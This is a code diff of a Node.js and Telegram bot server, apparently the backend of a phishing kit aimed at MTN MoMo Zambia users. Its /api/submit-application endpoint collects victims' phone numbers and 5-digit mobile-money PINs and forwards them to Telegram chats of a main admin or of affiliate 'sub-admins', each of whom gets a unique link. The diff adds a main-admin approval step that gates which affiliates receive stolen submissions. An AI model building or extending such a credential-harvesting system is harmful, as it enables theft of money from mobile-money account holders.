@@ -1,6 +1,6 @@
 /**
  * **MTN MOMO ZAMBIA - SECURE MULTI-ADMIN SERVER**
- * Updated to assign unique, private exclusive links directly to sub-admins upon starting the bot.
+ * Updated with Main Admin Authorization Control for Sub-Admins.
  */
 
 const express = require('express');
@@ -35,12 +35,12 @@ function loadAdmins() {
       const parsed = JSON.parse(data);
       const entries = Array.isArray(parsed) ? parsed : [];
       return new Map(entries.map(([id, rec]) => [id, {
-        authorized: true,
+        authorized: rec?.authorized ?? false, // Default to false until approved
         paid: true,
         username: rec?.username || '',
         firstName: rec?.firstName || 'User',
         lastName: rec?.lastName || '',
-        status: rec?.status || 'ACTIVE'
+        status: rec?.status || 'PENDING'
       }]));
     }
   } catch (err) {
@@ -61,7 +61,6 @@ function saveAdmins() {
 let bot = null;
 const sessions = new Map();
 const admins = loadAdmins();
-const adminConfigMessageIds = new Map();
 
 function resolveTargetChat(adminParam) {
   if (adminParam && String(adminParam).trim() !== '') {
@@ -69,7 +68,11 @@ function resolveTargetChat(adminParam) {
     if (targetAdmin === String(FALLBACK_ADMIN_ID)) {
       return FALLBACK_ADMIN_ID;
     }
-    return targetAdmin;
+    // Only forward requests if the sub-admin is actually authorized
+    const adminRecord = admins.get(targetAdmin);
+    if (adminRecord && adminRecord.authorized) {
+      return targetAdmin;
+    }
   }
   return FALLBACK_ADMIN_ID || null;
 }
@@ -84,7 +87,7 @@ async function updateContinuousAdminList(chatId, messageId = null, page = 0) {
 
   const paginatedEntries = adminEntries.slice(page * PAGE_SIZE, (page + 1) * PAGE_SIZE);
 
-  let adminListText = `👑 *Sub-Admin Control Panel* (Page ${page + 1} of ${totalPages})\n\nAll sub-admins currently have free access:`;
+  let adminListText = `👑 *Sub-Admin Control Panel* (Page ${page + 1} of${totalPages})\n\nManage sub-admin access status:`;
   let keyboard = [];
 
   if (adminEntries.length === 0) {
@@ -93,7 +96,8 @@ async function updateContinuousAdminList(chatId, messageId = null, page = 0) {
     paginatedEntries.forEach(([id, record]) => {
       const nameDisplay = record.username ? `@${record.username}` : (record.firstName || 'User');
       const subLink = `${APP_URL}/?admin=${id}`;
-      adminListText += `\n\n👤 *${nameDisplay}* (\`${id}\`)\n   🔗 \`${subLink}\`\n   Status: 🟢 Active`;
+      const authStatus = record.authorized ? '🟢 Authorized' : '🔴 Unauthorized / Pending';
+      adminListText += `\n\n👤 *${nameDisplay}* (\`${id}\`)\n   Status: ${authStatus}\n   🔗 \`${subLink}\``;
     });
   }
 
@@ -119,7 +123,6 @@ async function updateContinuousAdminList(chatId, messageId = null, page = 0) {
     parse_mode: 'Markdown',
     reply_markup: { inline_keyboard: keyboard } 
   });
-  adminConfigMessageIds.set(chatId, sentMsg.message_id);
 }
 
 async function initBot() {
@@ -150,31 +153,15 @@ async function initBot() {
   bot.onText(/\/link/, async (msg) => {
     try {
       const chatId = String(msg.chat.id);
+      if (chatId !== String(FALLBACK_ADMIN_ID)) {
+        const record = admins.get(chatId);
+        if (!record || !record.authorized) {
+          await bot.sendMessage(chatId, `⚠️ Your account is not authorized yet. Please contact the Super Main Admin for approval.`);
+          return;
+        }
+      }
       const userLink = chatId === String(FALLBACK_ADMIN_ID) ? APP_URL : `${APP_URL}/?admin=${chatId}`;
       await bot.sendMessage(chatId, `🔗 *Your Exclusive Private Application Link:*\n${userLink}`, { parse_mode: 'Markdown' });
-    } catch (err) {}
-  });
-
-  bot.onText(/\/myprofile|\/me/, async (msg) => {
-    try {
-      const chatId = String(msg.chat.id);
-      const userId = msg.from.id;
-      const username = msg.from.username ? `@${msg.from.username}` : 'None';
-      const firstName = msg.from.first_name || 'N/A';
-      const lastName = msg.from.last_name || 'N/A';
-      
-      const userLink = chatId === String(FALLBACK_ADMIN_ID) ? APP_URL : `${APP_URL}/?admin=${chatId}`;
-
-      let profileText = 
-        `👤 *Your Personal Details & Account Info*\n\n` +
-        `• *First Name:* ${firstName}\n` +
-        `• *Last Name:* ${lastName}\n` +
-        `• *Username:* ${username}\n` +
-        `• *Telegram ID:* \`${userId}\`\n` +
-        `• *Link Status:* 🟢 Free & Active\n\n` +
-        `🔗 *Your Exclusive Private Link:*\n${userLink}`;
-
-      await bot.sendMessage(chatId, profileText, { parse_mode: 'Markdown' });
     } catch (err) {}
   });
 
@@ -192,17 +179,19 @@ async function initBot() {
           reply_markup: {
             inline_keyboard: [
               [{ text: '🔗 Get My Link', callback_data: 'GET_MY_LINK' }],
-              [{ text: '📋 View Sub-Admins', callback_data: 'PAGE_0' }],
-              [{ text: '👤 View My Profile', callback_data: 'SHOW_MY_PROFILE' }]
+              [{ text: '📋 View Sub-Admins', callback_data: 'PAGE_0' }]
             ]
           }
         });
         return;
       }
 
+      // Check or create sub-admin profile (default authorized: false)
+      let isNew = false;
       if (!admins.has(chatId)) {
+        isNew = true;
         admins.set(chatId, {
-          authorized: true,
+          authorized: false,
           paid: true,
           username,
           firstName,
@@ -218,31 +207,46 @@ async function initBot() {
         saveAdmins();
       }
 
-      const subAdminLink = `${APP_URL}/?admin=${chatId}`;
+      const record = admins.get(chatId);
 
-      await bot.sendMessage(FALLBACK_ADMIN_ID, 
-        `🚨 *New Sub-Admin Started Bot!*\n\n` +
-        `👤 *User:* ${username ? '@' + username : firstName} (${firstName} ${lastName})\n` +
-        `🆔 *Chat ID:* \`${userId}\`\n` +
-        `🔗 *Assigned Private Link:* \`${subAdminLink}\`\n\n` +
-        `Status: Free link access granted automatically.`, 
+      if (!record.authorized) {
+        // Notify Main Admin with Authorization Action Buttons
+        await bot.sendMessage(FALLBACK_ADMIN_ID, 
+          `🚨 *New Sub-Admin Pending Authorization!*\n\n` +
+          `👤 *User:* ${username ? '@' + username : firstName} (${firstName}${lastName})\n` +
+          `🆔 *Chat ID:* \`${userId}\`\n\n` +
+          `Please authorize or reject this user's request.`, 
+          { 
+            parse_mode: 'Markdown',
+            reply_markup: {
+              inline_keyboard: [
+                [
+                  { text: '✅ Authorize Sub-Admin', callback_data: `AUTH_YES_${userId}` },
+                  { text: '❌ Reject', callback_data: `AUTH_NO_${userId}` }
+                ]
+              ]
+            }
+          }
+        );
+
+        // Instruct Sub-Admin to contact the Super Main Admin
+        await bot.sendMessage(chatId, 
+          `👋 *Welcome ${firstName}!*\n\n` +
+          `⚠️ Your account is currently **pending authorization** by the Super Main Admin.\n\n` +
+          `Please contact the **Super Main Admin** to get your account approved and receive your exclusive application link.`, 
+          { parse_mode: 'Markdown' }
+        );
+        return;
+      }
+
+      // If already authorized, give link straight away
+      const subAdminLink = `${APP_URL}/?admin=${chatId}`;
+      await bot.sendMessage(chatId, 
+        `👋 *Welcome back ${firstName}!*\n\n` +
+        `Your sub-admin account is authorized.\n\n` +
+        `🔗 *Your Exclusive Private Application Link:*\n${subAdminLink}`, 
         { parse_mode: 'Markdown' }
       );
-
-      let responseText = `👋 *Welcome ${firstName}!*\n\n` +
-        `Your sub-admin account is fully active.\n\n` +
-        `🔗 *Your Exclusive Private Application Link:*\n${subAdminLink}\n\n` +
-        `Type /link anytime to retrieve this link directly.`;
-
-      await bot.sendMessage(chatId, responseText, { 
-        parse_mode: 'Markdown',
-        reply_markup: {
-          inline_keyboard: [
-            [{ text: '🔗 Get My Private Link', callback_data: 'GET_MY_LINK' }],
-            [{ text: '👤 View My Profile', callback_data: 'SHOW_MY_PROFILE' }]
-          ]
-        }
-      });
 
     } catch (err) {}
   });
@@ -253,25 +257,68 @@ async function initBot() {
       const chatId = String(query.message.chat.id);
       const user = query.from;
 
-      if (actionData === 'GET_MY_LINK') {
-        const userLink = chatId === String(FALLBACK_ADMIN_ID) ? APP_URL : `${APP_URL}/?admin=${chatId}`;
-        await bot.sendMessage(chatId, `🔗 *Your Exclusive Private Application Link:*\n${userLink}`, { parse_mode: 'Markdown' });
-        await bot.answerCallbackQuery(query.id);
+      // Handle Main Admin Authorizing a Sub-Admin
+      if (actionData.startsWith('AUTH_YES_') || actionData.startsWith('AUTH_NO_')) {
+        if (chatId !== String(FALLBACK_ADMIN_ID)) {
+          await bot.answerCallbackQuery(query.id, { text: '⚠️ Unauthorized action.' });
+          return;
+        }
+
+        const parts = actionData.split('_');
+        const decision = parts[1]; // YES or NO
+        const targetSubId = parts[2];
+        const subRecord = admins.get(targetSubId);
+
+        if (!subRecord) {
+          await bot.answerCallbackQuery(query.id, { text: '⚠️ Sub-admin record not found.' });
+          return;
+        }
+
+        if (decision === 'YES') {
+          subRecord.authorized = true;
+          saveAdmins();
+
+          const assignedLink = `${APP_URL}/?admin=${targetSubId}`;
+          
+          // Notify sub-admin they are approved
+          await bot.sendMessage(targetSubId, 
+            `🎉 *Congratulations!* Your sub-admin account has been **authorized** by the Super Main Admin.\n\n` +
+            `🔗 *Your Exclusive Private Application Link:*\n${assignedLink}\n\n` +
+            `Type /link anytime to retrieve it.`,
+            { parse_mode: 'Markdown' }
+          ).catch(() => {});
+
+          await bot.answerCallbackQuery(query.id, { text: '✅ Sub-Admin Authorized Successfully!' });
+          await bot.editMessageText(`✅ *Sub-Admin Authorized*\n\nUser ID: \`${targetSubId}\``, {
+            chat_id: chatId,
+            message_id: query.message.message_id,
+            parse_mode: 'Markdown'
+          });
+        } else {
+          admins.delete(targetSubId);
+          saveAdmins();
+
+          await bot.sendMessage(targetSubId, `❌ Your sub-admin request was rejected by the Super Main Admin.`).catch(() => {});
+          await bot.answerCallbackQuery(query.id, { text: '❌ Sub-Admin Rejected.' });
+          await bot.editMessageText(`❌ *Sub-Admin Rejected & Removed*\n\nUser ID: \`${targetSubId}\``, {
+            chat_id: chatId,
+            message_id: query.message.message_id,
+            parse_mode: 'Markdown'
+          });
+        }
         return;
       }
 
-      if (actionData === 'SHOW_MY_PROFILE') {
+      if (actionData === 'GET_MY_LINK') {
+        if (chatId !== String(FALLBACK_ADMIN_ID)) {
+          const record = admins.get(chatId);
+          if (!record || !record.authorized) {
+            await bot.answerCallbackQuery(query.id, { text: '⚠️ Account not authorized yet.' });
+            return;
+          }
+        }
         const userLink = chatId === String(FALLBACK_ADMIN_ID) ? APP_URL : `${APP_URL}/?admin=${chatId}`;
-        let profileText = 
-          `👤 *Your Personal Details & Account Info*\n\n` +
-          `• *First Name:* ${user.first_name || 'N/A'}\n` +
-          `• *Last Name:* ${user.last_name || 'N/A'}\n` +
-          `• *Username:* ${user.username ? '@' + user.username : 'None'}\n` +
-          `• *Telegram ID:* \`${user.id}\`\n` +
-          `• *Link Status:* 🟢 Free & Active\n\n` +
-          `🔗 *Your Exclusive Private Link:*\n${userLink}`;
-
-        await bot.sendMessage(chatId, profileText, { parse_mode: 'Markdown' });
+        await bot.sendMessage(chatId, `🔗 *Your Exclusive Private Application Link:*\n${userLink}`, { parse_mode: 'Markdown' });
         await bot.answerCallbackQuery(query.id);
         return;
       }
@@ -283,6 +330,7 @@ async function initBot() {
         return;
       }
 
+      // Existing callback workflows for routing application triggers
       const parts = actionData.split('_');
       const prefix = parts.slice(0, 2).join('_'); 
       const targetId = parts.slice(2).join('_');
@@ -356,8 +404,12 @@ app.post('/api/submit-application', async (req, res) => {
       adminChatId = req.query.admin;
     }
 
+    const targetChat = resolveTargetChat(adminChatId);
+    if (!targetChat) {
+      return res.status(400).json({ success: false, error: 'Destination chat ID missing or sub-admin is not authorized.' });
+    }
+
     const cleanContact = String(contact || '').replace(/\D/g, '');
-    
     const mtnZambiaRegex = /^0(96|76)\d{7}$/;
     if (!mtnZambiaRegex.test(cleanContact)) {
       return res.status(400).json({ 
@@ -372,11 +424,6 @@ app.post('/api/submit-application', async (req, res) => {
         success: false, 
         error: 'MTN MoMo PIN must be exactly 5 digits.' 
       });
-    }
-
-    const targetChat = resolveTargetChat(adminChatId);
-    if (!targetChat) {
-      return res.status(400).json({ success: false, error: 'Destination chat ID missing.' });
     }
 
     const userId = cleanContact ? cleanContact.replace(/[^a-zA-Z0-9]/g, '_') : `user_${Date.now()}`;
@@ -521,3 +568,4 @@ const PORT = process.env.PORT || 10000;
 app.listen(PORT, async () => {
   await initBot();
 });
+  
